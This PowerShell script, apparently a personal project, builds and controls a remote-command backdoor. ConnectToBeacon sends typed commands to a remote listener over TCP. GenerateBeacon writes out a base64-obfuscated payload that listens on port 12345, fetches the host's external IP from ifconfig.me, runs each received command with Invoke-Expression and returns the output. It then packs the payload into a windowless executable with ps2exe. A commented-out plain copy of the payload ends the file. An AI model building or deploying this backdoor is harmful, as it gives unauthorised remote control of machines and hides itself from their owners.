<#
 .Synopsis
  Connect and communicate with a TCP socket over a specified address and port. 

 .Description
  Connects to the pre-established beacon for remote command execution. Utilizes a TCP connection for this transaction. 

 .Parameter TgtAddr
  Target address [IPv4]

 .Parameter TgtPort
  Target port 
#>
function ConnectToBeacon{
    param($TgtAddr, $TgtPort)
    if($TgtAddr -eq $null -Or $TgtPort -eq $null){
        Write-Host "Specify target address and port..."
        Write-Host "Target Address: " -NoNewLine
        $TgtAddr = Read-Host
        Write-Host "Target Port: " -NoNewLine
        $TgtPort = Read-Host
    }
    $Conn = New-Object System.Net.Sockets.TcpClient($TgtAddr,$TgtPort)
    $Stream = $Conn.GetStream()
    $Reader = New-Object System.IO.StreamReader($Stream)
    $Writer = New-Object System.IO.StreamWriter($Stream)
    $Writer.AutoFlush = $true
    $Buff = New-Object System.Byte[] 1024
    $Enc = New-Object System.Text.AsciiEncoding
    if ($Conn.Connected){
        Write-Host "Connected to remote target"
        Write-Host "Remote Address: $TgtAddr"
        Write-Host "Remote Port: $TgtPort"
        Write-Host
    }
    while ($Conn.Connected){
        if ($Conn.Connected){
            Write-Host -NoNewline "> "
            $TgtComm = Read-Host
            if ($TgtComm -eq "quit" -Or $TgtComm -eq "exit"){
                break
            }
            $Writer.WriteLine($TgtComm) | Out-Null
        }
        while (($i = $Stream.Read($Buff,0,$Buff.Length)) -ne 0){
            # Convert the bytes to string
            $Resp = $Enc.GetString($Buff,0,$i)
            if($Resp -match "EndMessage"){
                if ($Conn.Connected){
                    Write-Host -NoNewline "> "
                    $TgtComm = Read-Host
                    if ($TgtComm -eq "quit" -Or $TgtComm -eq "exit"){
                        exit
                    }
                    $Writer.WriteLine($TgtComm) | Out-Null
                }
            }
            write-host $Resp.Replace("EndMessage","") -NoNewLine
        }
    }
    $Reader.Close()
    $Writer.Close()
    $Conn.Close()
}

<#
 .Synopsis
  Create a TCP Listener that accepts commands from a TCP Client. 

 .Description
  Creates an executable TCP listener that can be connected to via a TCP client.

 .Parameter TgtAddr
  Target address [IPv4]

 .Parameter TgtPort
  Target port 
#>
function GenerateBeacon{
    # Parameters for the local endpoint the beacon is using
    param($HomeAddr, $HomePort, $ShellName)
    try{
        # Create script
        $file = '$str = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICAgICMgU3dpdGNoIGF0IHNvbWUgcG9pbnQgdG8gZ2VuZXJhdGUgaW5mbyBkeW5hbWljYWxseQ0KICAgIGlmKCRIb21lQWRkciAtZXEgJG51bGwgLU9yICRIb21lUG9ydCAtZXEgJG51bGwpew0KICAgICMgICAgIFdyaXRlLUhvc3QgIlNwZWNpZnkgaG9tZSBhZGRyZXNzIGFuZCBwb3J0Ig0KICAgICMgICAgIFdyaXRlLUhvc3QgIkhvbWUgQWRkcmVzczogIiAtTm9OZXdMaW5lDQogICAgIyAgICAgJEhvbWVBZGRyID0gUmVhZC1Ib3N0DQogICAgIyAgICAgV3JpdGUtSG9zdCAiSG9tZSBQb3J0OiAiIC1Ob05ld0xpbmUNCiAgICAjICAgICAkSG9tZVBvcnQgPSBSZWFkLUhvc3QNCiAgICAjIEZvciBwcmFjdGljYWwgcHVycG9zZXMsIGJpbmQgb24gYWxsIGFkZHJlc3NlcyANCiAgICAjIElkZWFsbHksIHRoZSBwb3J0IHdvdWxkIGJlIGNob3NlbiBhdCBnZW5lcmF0aW9uLiBIb3dldmVyLCBJJ20ga2VlcGluZyBpdCAxMjM0NSBmb3IgdGVzdGluZy4gDQogICAgJEhvbWVBZGRyID0gIjAuMC4wLjAiDQogICAgJEhvbWVQb3J0ID0gMTIzNDUNCiAgICB9DQogICAgIyBJREssIHNlbmQgdGhpcyBhZnRlciBzZXJ2ZXIgaXMgZXN0YWJsaXNoZWQgaWcNCiAgICAkSG9tZUV4dCA9IChpbnZva2Utd2VicmVxdWVzdCAtdXJpIGlmY29uZmlnLm1lKS5Db250ZW50DQoNCiAgICAjIE5ldyBUQ1AgTGlzdGVuZXIgb2JqZWN0DQogICAgJFNlcnZlciA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcExpc3RlbmVyKCRIb21lQWRkciwgJEhvbWVQb3J0KQ0KICAgICMgTmV3IEJ1ZmZlciBvYmplY3QgdG8gaG9sZCB0aGUgY29udmVydGVkIG1lc3NhZ2VzIGluIGJ5dGVzDQogICAgJEJ1ZmYgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNA0KICAgICMgT2JqZWN0IHRvIGFzY2lpIGVuY29kZSB0aGUgbWVzc2FnZXMNCiAgICAkRW5jID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nDQogICAgIyBTdGFydCB0aGUgc2VydmVyDQogICAgJFNlcnZlci5zdGFydCgpDQogICAgIyBGb3JldmVyDQogICAgd2hpbGUgKCR0cnVlKXsNCiAgICAgICAgIyBBY2NlcHQgYSBjbGllbnQNCiAgICAgICAgJENsaWVudCA9ICRTZXJ2ZXIuQWNjZXB0VGNwQ2xpZW50KCkNCiAgICAgICAgIyBHZXQgdGhlIGNsaWVudCBtZXNzYWdlIHN0cmVhbQ0KICAgICAgICAkU3RyZWFtID0gJENsaWVudC5HZXRTdHJlYW0oKQ0KICAgICAgICAjIFdoaWxlIHRoZSBieXRlIHN0cmVhbSBpcyBub3QgMCAoZS5nLiwgc3RpbGwgaW5jb21pbmcpDQogICAgICAgIHdoaWxlICgoJGkgPSAkU3RyZWFtLlJlYWQoJEJ1ZmYsMCwkQnVmZi5MZW5ndGgpKSAtbmUgMCl7DQogICAgICAgICAgICAjIENvbnZlcnQgdGhlIGJ5dGVzIHRvIHN0cmluZw0KICAgICAgICAgICAgJFJlc3AgPSAkRW5jLkdldFN0cmluZygkQnVmZiwwLCRpKQ0KICAgICAgICAgICAgIyBRdWl0IG1lc3NhZ2UNCiAgICAgICAgICAgIHRyeXsNCiAgICAgICAgICAgICAgICAjIFJ1biB0aGUgcmVjaWV2ZWQgbWVzc2FnZSBhcyBhIGNvbW1hbmQNCiAgICAgICAgICAgICAgICAkQ29tbSA9IChJbnZva2UtRXhwcmVzc2lvbiAkUmVzcCB8IG91dC1TdHJpbmcpDQogICAgICAgICAgICAgICAgIyBFbmNvZGUgdGhlIGNvbW1hbmQgb3V0cHV0DQogICAgICAgICAgICAgICAgJERhdGEgPSAkRW5jLkdldEJ5dGVzKCRDb21tKQ0KICAgICAgICAgICAgICAgICRCbGFuayA9IE5ldy1PYmplY3QgYnl0ZVtdIDEwMjQNCiAgICAgICAgICAgICAgICAkRW5kID0gJEVuYy5HZXRCeXRlcygiRW5kTWVzc2FnZSIpDQogICAgICAgICAgICAgICAgIyBTZW5kIGl0IHRvIHRoZSBjbGllbnQNCiAgICAgICAgICAgICAgICAkU3RyZWFtLldyaXRlKCREYXRhLDAsJERhdGEuTGVuZ3RoKQ0KICAgICAgICAgICAgICAgICRTdHJlYW0uV3JpdGUoJEJsYW5rLDAsJEJsYW5rLkxlbmd0aCkNCiAgICAgICAgICAgICAgICAkU3RyZWFtLldyaXRlKCRFbmQsMCwkRW5kLkxlbmd0aCkNCiAgICAgICAgICAgICAgICAkU3RyZWFtLldyaXRlKCRCbGFuaywwLCRCbGFuay5MZW5ndGgpDQogICAgICAgICAgICAgICAgfWNhdGNoew0KICAgICAgICAgICAgICAgICAgICAkRGF0YSA9ICRFbmMuR2V0Qnl0ZXMoJEVycm9yWzBdKQ0KICAgICAgICAgICAgICAgICAgICAkTmV3bCA9ICRFbmMuR2V0Qnl0ZXMoImBuIikNCiAgICAgICAgICAgICAgICAgICAgJEJsYW5rID0gTmV3LU9iamVjdCBieXRlW10gMTAyNA0KICAgICAgICAgICAgICAgICAgICAkRW5kID0gJEVuYy5HZXRCeXRlcygiRW5kTWVzc2FnZSIpDQogICAgICAgICAgICAgICAgICAgICRTdHJlYW0uV3JpdGUoJERhdGEsMCwkRGF0YS5MZW5ndGgpDQogICAgICAgICAgICAgICAgICAgICRTdHJlYW0uV3JpdGUoJE5ld2wsMCwkTmV3bC5MZW5ndGgpDQogICAgICAgICAgICAgICAgICAgICRTdHJlYW0uV3JpdGUoJEJsYW5rLDAsJEJsYW5rLkxlbmd0aCkNCiAgICAgICAgICAgICAgICAgICAgJFN0cmVhbS5Xcml0ZSgkRW5kLDAsJEVuZC5MZW5ndGgpDQogICAgICAgICAgICAgICAgICAgICRTdHJlYW0uV3JpdGUoJEJsYW5rLDAsJEJsYW5rLkxlbmd0aCkgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICAkU3RyZWFtLkNsb3NlKCkNCiAgICB9Cg=="))
        Invoke-Expression $str'
        Out-File -InputObject $file -FilePath "shell.ps1" 

        # Convert script to exe
        if(!$ShellName){
            $ShellName = "shell.exe"
        }
        $loc = Get-Location
        Invoke-ps2exe $loc\shell.ps1 -outputfile $ShellName -NoConsole
    }catch{
        write-host $Error[0]
<#        # Try to install ps2exe
        Install-PackageProvider NuGet -Force
        Set-PSRepository PSGallery -InstallationPolicy Trusted
        Install-Module ps2exe -Repository PSGallery
        GenerateBeacon#>
    }

<#    # Script 
    # Switch at some point to generate info dynamically
    if($HomeAddr -eq $null -Or $HomePort -eq $null){
    #     Write-Host "Specify home address and port"
    #     Write-Host "Home Address: " -NoNewLine
    #     $HomeAddr = Read-Host
    #     Write-Host "Home Port: " -NoNewLine
    #     $HomePort = Read-Host
    # For practical purposes, bind on all addresses 
    # Ideally, the port would be chosen at generation. However, I'm keeping it 12345 for testing. 
    $HomeAddr = "0.0.0.0"
    $HomePort = 12345
    }
    # IDK, send this after server is established ig
    $HomeExt = (invoke-webrequest -uri ifconfig.me).Content

    # New TCP Listener object
    $Server = New-Object System.Net.Sockets.TcpListener($HomeAddr, $HomePort)
    # New Buffer object to hold the converted messages in bytes
    $Buff = New-Object System.Byte[] 1024
    # Object to ascii encode the messages
    $Enc = New-Object System.Text.AsciiEncoding
    # Start the server
    $Server.start()
    # Forever
    while ($true){
        # Accept a client
        $Client = $Server.AcceptTcpClient()
        # Get the client message stream
        $Stream = $Client.GetStream()
        # While the byte stream is not 0 (e.g., still incoming)
        while (($i = $Stream.Read($Buff,0,$Buff.Length)) -ne 0){
            # Convert the bytes to string
            $Resp = $Enc.GetString($Buff,0,$i)
            # Quit message
            try{
                # Run the recieved message as a command
                $Comm = (Invoke-Expression $Resp | out-String)
                # Encode the command output
                $Data = $Enc.GetBytes($Comm)
                $Blank = New-Object byte[] 1024
                $End = $Enc.GetBytes("EndMessage")
                # Send it to the client
                $Stream.Write($Data,0,$Data.Length)
                $Stream.Write($Blank,0,$Blank.Length)
                $Stream.Write($End,0,$End.Length)
                $Stream.Write($Blank,0,$Blank.Length)
                }catch{
                    $Data = $Enc.GetBytes($Error[0])
                    $Newl = $Enc.GetBytes("`n")
                    $Blank = New-Object byte[] 1024
                    $End = $Enc.GetBytes("EndMessage")
                    $Stream.Write($Data,0,$Data.Length)
                    $Stream.Write($Newl,0,$Newl.Length)
                    $Stream.Write($Blank,0,$Blank.Length)
                    $Stream.Write($End,0,$End.Length)
                    $Stream.Write($Blank,0,$Blank.Length)   
            }
        }
        $Stream.Close()
    }
#>
}